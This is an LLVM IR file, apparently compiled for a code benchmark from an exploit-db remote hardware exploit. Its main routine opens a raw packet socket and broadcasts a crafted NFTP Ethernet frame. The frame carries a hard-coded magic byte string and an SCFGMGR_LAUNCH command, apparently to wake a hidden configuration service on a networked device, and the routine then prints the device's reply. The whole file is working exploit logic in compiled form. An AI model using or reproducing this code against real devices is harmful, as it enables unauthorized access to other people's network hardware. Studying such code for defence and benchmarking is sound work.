; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_32938.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_32938.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.ifreq = type { i32, %struct.TYPE_3__, i32 }
%struct.TYPE_3__ = type { i8* }
%struct.sockaddr_ll = type { i32, %struct.raw_packet*, i32, i32, i32, i8*, i32 }
%struct.raw_packet = type { i8*, %struct.TYPE_4__, i8*, i8* }
%struct.TYPE_4__ = type { i8*, i8*, %struct.raw_packet* }
%struct.sockaddr = type { i32 }

@ETH_ALEN = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [21 x i8] c"usage : %s [IFNAME]\0A\00", align 1
@AF_PACKET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@ETH_P_ALL = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [47 x i8] c"You should probably run this program as root.\0A\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@IFNAMSIZ = common dso_local global i32 0, align 4
@SIOCGIFHWADDR = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [6 x i8] c"ioctl\00", align 1
@SIOCGIFINDEX = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [17 x i8] c"E\D1\BB3\9B\07\A6a\8B!\14\DB\C0\D7x>\00", align 1
@ETH_P_NFTP = common dso_local global i64 0, align 8
@SCFGMGR_LAUNCH = common dso_local global i32 0, align 4
@PF_PACKET = common dso_local global i32 0, align 4
@ARPHRD_ETHER = common dso_local global i32 0, align 4
@PACKET_OTHERHOST = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [7 x i8] c"sendto\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"recvfrom\00", align 1
@.str.7 = private unnamed_addr constant [31 x i8] c"packet is too short: %d bytes\0A\00", align 1
@.str.8 = private unnamed_addr constant [51 x i8] c"received packet: %d bytes (payload len = %d) from \00", align 1
@.str.9 = private unnamed_addr constant [7 x i8] c"%02X%c\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"%02X \00", align 1
@.str.11 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca %struct.ifreq, align 8
  %13 = alloca %struct.sockaddr_ll, align 8
  %14 = alloca %struct.raw_packet, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i32, i32* @ETH_ALEN, align 4
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %10, align 8
  %18 = alloca i8, i64 %16, align 16
  store i64 %16, i64* %11, align 8
  %19 = call i32 @memset(%struct.raw_packet* %14, i32 0, i32 48)
  %20 = load i32, i32* %4, align 4
  %21 = icmp slt i32 %20, 2
  br i1 %21, label %22, label %29

22:                                               ; preds = %2
  %23 = load i32, i32* @stderr, align 4
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 (i32, i8*, ...) @fprintf(i32 %23, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0), i8* %26)
  %28 = call i32 @exit(i32 1) #4
  unreachable

29:                                               ; preds = %2
  %30 = load i32, i32* @AF_PACKET, align 4
  %31 = load i32, i32* @SOCK_RAW, align 4
  %32 = load i64, i64* @ETH_P_ALL, align 8
  %33 = call i8* @htons(i64 %32)
  %34 = call i32 @socket(i32 %30, i32 %31, i8* %33)
  store i32 %34, i32* %6, align 4
  %35 = load i32, i32* %6, align 4
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %37, label %46

37:                                               ; preds = %29
  %38 = call i64 (...) @geteuid()
  %39 = icmp ne i64 %38, 0
  br i1 %39, label %40, label %43

40:                                               ; preds = %37
  %41 = load i32, i32* @stderr, align 4
  %42 = call i32 (i32, i8*, ...) @fprintf(i32 %41, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.1, i64 0, i64 0))
  br label %43

43:                                               ; preds = %40, %37
  %44 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %45 = call i32 @exit(i32 1) #4
  unreachable

46:                                               ; preds = %29
  %47 = call i32 (...) @getuid()
  %48 = call i32 @seteuid(i32 %47)
  %49 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %12, i32 0, i32 2
  %50 = load i32, i32* %49, align 8
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 1
  %53 = load i8*, i8** %52, align 8
  %54 = load i32, i32* @IFNAMSIZ, align 4
  %55 = call i32 @strncpy(i32 %50, i8* %53, i32 %54)
  %56 = load i32, i32* %6, align 4
  %57 = load i32, i32* @SIOCGIFHWADDR, align 4
  %58 = call i32 @ioctl(i32 %56, i32 %57, %struct.ifreq* %12)
  store i32 %58, i32* %7, align 4
  %59 = load i32, i32* %7, align 4
  %60 = icmp slt i32 %59, 0
  br i1 %60, label %61, label %64

61:                                               ; preds = %46
  %62 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0))
  %63 = call i32 @exit(i32 1) #4
  unreachable

64:                                               ; preds = %46
  %65 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %12, i32 0, i32 1
  %66 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %65, i32 0, i32 0
  %67 = load i8*, i8** %66, align 8
  %68 = load i32, i32* @ETH_ALEN, align 4
  %69 = call i32 @memcpy(i8* %18, i8* %67, i32 %68)
  %70 = load i32, i32* %6, align 4
  %71 = load i32, i32* @SIOCGIFINDEX, align 4
  %72 = call i32 @ioctl(i32 %70, i32 %71, %struct.ifreq* %12)
  store i32 %72, i32* %7, align 4
  %73 = load i32, i32* %7, align 4
  %74 = icmp slt i32 %73, 0
  br i1 %74, label %75, label %78

75:                                               ; preds = %64
  %76 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0))
  %77 = call i32 @exit(i32 1) #4
  unreachable

78:                                               ; preds = %64
  %79 = getelementptr inbounds %struct.raw_packet, %struct.raw_packet* %14, i32 0, i32 1
  %80 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %79, i32 0, i32 0
  %81 = load i8*, i8** %80, align 8
  %82 = load i32, i32* @ETH_ALEN, align 4
  %83 = call i32 @memcpy(i8* %81, i8* %18, i32 %82)
  %84 = getelementptr inbounds %struct.raw_packet, %struct.raw_packet* %14, i32 0, i32 1
  %85 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %84, i32 0, i32 2
  %86 = load %struct.raw_packet*, %struct.raw_packet** %85, align 8
  %87 = load i32, i32* @ETH_ALEN, align 4
  %88 = call i32 @memset(%struct.raw_packet* %86, i32 255, i32 %87)
  %89 = getelementptr inbounds %struct.raw_packet, %struct.raw_packet* %14, i32 0, i32 0
  %90 = load i8*, i8** %89, align 8
  %91 = call i32 @memcpy(i8* %90, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0), i32 16)
  %92 = call i8* @htole16(i32 16)
  %93 = getelementptr inbounds %struct.raw_packet, %struct.raw_packet* %14, i32 0, i32 2
  store i8* %92, i8** %93, align 8
  %94 = load i64, i64* @ETH_P_NFTP, align 8
  %95 = call i8* @htons(i64 %94)
  %96 = getelementptr inbounds %struct.raw_packet, %struct.raw_packet* %14, i32 0, i32 1
  %97 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %96, i32 0, i32 1
  store i8* %95, i8** %97, align 8
  %98 = load i32, i32* @SCFGMGR_LAUNCH, align 4
  %99 = call i8* @htole16(i32 %98)
  %100 = getelementptr inbounds %struct.raw_packet, %struct.raw_packet* %14, i32 0, i32 3
  store i8* %99, i8** %100, align 8
  %101 = load i32, i32* @PF_PACKET, align 4
  %102 = getelementptr inbounds %struct.sockaddr_ll, %struct.sockaddr_ll* %13, i32 0, i32 6
  store i32 %101, i32* %102, align 8
  %103 = load i64, i64* @ETH_P_NFTP, align 8
  %104 = call i8* @htons(i64 %103)
  %105 = getelementptr inbounds %struct.sockaddr_ll, %struct.sockaddr_ll* %13, i32 0, i32 5
  store i8* %104, i8** %105, align 8
  %106 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %12, i32 0, i32 0
  %107 = load i32, i32* %106, align 8
  %108 = getelementptr inbounds %struct.sockaddr_ll, %struct.sockaddr_ll* %13, i32 0, i32 4
  store i32 %107, i32* %108, align 8
  %109 = load i32, i32* @ARPHRD_ETHER, align 4
  %110 = getelementptr inbounds %struct.sockaddr_ll, %struct.sockaddr_ll* %13, i32 0, i32 3
  store i32 %109, i32* %110, align 4
  %111 = load i32, i32* @PACKET_OTHERHOST, align 4
  %112 = getelementptr inbounds %struct.sockaddr_ll, %struct.sockaddr_ll* %13, i32 0, i32 2
  store i32 %111, i32* %112, align 8
  %113 = load i32, i32* @ETH_ALEN, align 4
  %114 = getelementptr inbounds %struct.sockaddr_ll, %struct.sockaddr_ll* %13, i32 0, i32 0
  store i32 %113, i32* %114, align 8
  %115 = getelementptr inbounds %struct.sockaddr_ll, %struct.sockaddr_ll* %13, i32 0, i32 1
  %116 = load %struct.raw_packet*, %struct.raw_packet** %115, align 8
  %117 = load i32, i32* @ETH_ALEN, align 4
  %118 = call i32 @memset(%struct.raw_packet* %116, i32 255, i32 %117)
  %119 = load i32, i32* %6, align 4
  %120 = bitcast %struct.sockaddr_ll* %13 to %struct.sockaddr*
  %121 = call i32 @sendto(i32 %119, %struct.raw_packet* %14, i32 40, i32 0, %struct.sockaddr* %120, i32 48)
  store i32 %121, i32* %7, align 4
  %122 = load i32, i32* %7, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %127

124:                                              ; preds = %78
  %125 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  %126 = call i32 @exit(i32 1) #4
  unreachable

127:                                              ; preds = %78
  br label %128

128:                                              ; preds = %138, %127
  %129 = call i32 @memset(%struct.raw_packet* %14, i32 0, i32 48)
  %130 = load i32, i32* %6, align 4
  %131 = call i32 @recvfrom(i32 %130, %struct.raw_packet* %14, i32 48, i32 0, i32* null, i32* null)
  store i32 %131, i32* %7, align 4
  %132 = load i32, i32* %7, align 4
  %133 = icmp eq i32 %132, -1
  br i1 %133, label %134, label %137

134:                                              ; preds = %128
  %135 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  %136 = call i32 @exit(i32 1) #4
  unreachable

137:                                              ; preds = %128
  br label %138

138:                                              ; preds = %137
  %139 = getelementptr inbounds %struct.raw_packet, %struct.raw_packet* %14, i32 0, i32 1
  %140 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %139, i32 0, i32 1
  %141 = load i8*, i8** %140, align 8
  %142 = call i64 @ntohs(i8* %141)
  %143 = load i64, i64* @ETH_P_NFTP, align 8
  %144 = icmp ne i64 %142, %143
  br i1 %144, label %128, label %145

145:                                              ; preds = %138
  %146 = load i32, i32* %7, align 4
  %147 = sext i32 %146 to i64
  %148 = icmp ult i64 %147, 40
  br i1 %148, label %149, label %154

149:                                              ; preds = %145
  %150 = load i32, i32* @stderr, align 4
  %151 = load i32, i32* %7, align 4
  %152 = call i32 (i32, i8*, ...) @fprintf(i32 %150, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.7, i64 0, i64 0), i32 %151)
  %153 = call i32 @exit(i32 1) #4
  unreachable

154:                                              ; preds = %145
  %155 = getelementptr inbounds %struct.raw_packet, %struct.raw_packet* %14, i32 0, i32 2
  %156 = load i8*, i8** %155, align 8
  %157 = call i32 @be16toh(i8* %156)
  store i32 %157, i32* %9, align 4
  %158 = load i32, i32* %7, align 4
  %159 = load i32, i32* %9, align 4
  %160 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.8, i64 0, i64 0), i32 %158, i32 %159)
  store i32 0, i32* %8, align 4
  br label %161

161:                                              ; preds = %181, %154
  %162 = load i32, i32* %8, align 4
  %163 = load i32, i32* @ETH_ALEN, align 4
  %164 = icmp slt i32 %162, %163
  br i1 %164, label %165, label %184

165:                                              ; preds = %161
  %166 = getelementptr inbounds %struct.raw_packet, %struct.raw_packet* %14, i32 0, i32 1
  %167 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %166, i32 0, i32 0
  %168 = load i8*, i8** %167, align 8
  %169 = load i32, i32* %8, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i8, i8* %168, i64 %170
  %172 = load i8, i8* %171, align 1
  %173 = sext i8 %172 to i32
  %174 = load i32, i32* %8, align 4
  %175 = load i32, i32* @ETH_ALEN, align 4
  %176 = sub nsw i32 %175, 1
  %177 = icmp eq i32 %174, %176
  %178 = zext i1 %177 to i64
  %179 = select i1 %177, i32 10, i32 58
  %180 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i64 0, i64 0), i32 %173, i32 %179)
  br label %181

181:                                              ; preds = %165
  %182 = load i32, i32* %8, align 4
  %183 = add nsw i32 %182, 1
  store i32 %183, i32* %8, align 4
  br label %161

184:                                              ; preds = %161
  store i32 0, i32* %8, align 4
  br label %185

185:                                              ; preds = %211, %184
  %186 = load i32, i32* %8, align 4
  %187 = load i32, i32* %9, align 4
  %188 = icmp slt i32 %186, %187
  br i1 %188, label %189, label %193

189:                                              ; preds = %185
  %190 = load i32, i32* %8, align 4
  %191 = sext i32 %190 to i64
  %192 = icmp ult i64 %191, 8
  br label %193

193:                                              ; preds = %189, %185
  %194 = phi i1 [ false, %185 ], [ %192, %189 ]
  br i1 %194, label %195, label %214

195:                                              ; preds = %193
  %196 = getelementptr inbounds %struct.raw_packet, %struct.raw_packet* %14, i32 0, i32 0
  %197 = load i8*, i8** %196, align 8
  %198 = load i32, i32* %8, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds i8, i8* %197, i64 %199
  %201 = load i8, i8* %200, align 1
  %202 = sext i8 %201 to i32
  %203 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i32 %202)
  %204 = load i32, i32* %8, align 4
  %205 = add nsw i32 %204, 1
  %206 = srem i32 %205, 16
  %207 = icmp eq i32 %206, 0
  br i1 %207, label %208, label %210

208:                                              ; preds = %195
  %209 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11, i64 0, i64 0))
  br label %210

210:                                              ; preds = %208, %195
  br label %211

211:                                              ; preds = %210
  %212 = load i32, i32* %8, align 4
  %213 = add nsw i32 %212, 1
  store i32 %213, i32* %8, align 4
  br label %185

214:                                              ; preds = %193
  %215 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  %216 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %216)
  %217 = load i32, i32* %3, align 4
  ret i32 %217
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @memset(%struct.raw_packet*, i32, i32) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @socket(i32, i32, i8*) #2

declare dso_local i8* @htons(i64) #2

declare dso_local i64 @geteuid(...) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @seteuid(i32) #2

declare dso_local i32 @getuid(...) #2

declare dso_local i32 @strncpy(i32, i8*, i32) #2

declare dso_local i32 @ioctl(i32, i32, %struct.ifreq*) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i8* @htole16(i32) #2

declare dso_local i32 @sendto(i32, %struct.raw_packet*, i32, i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @recvfrom(i32, %struct.raw_packet*, i32, i32, i32*, i32*) #2

declare dso_local i64 @ntohs(i8*) #2

declare dso_local i32 @be16toh(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
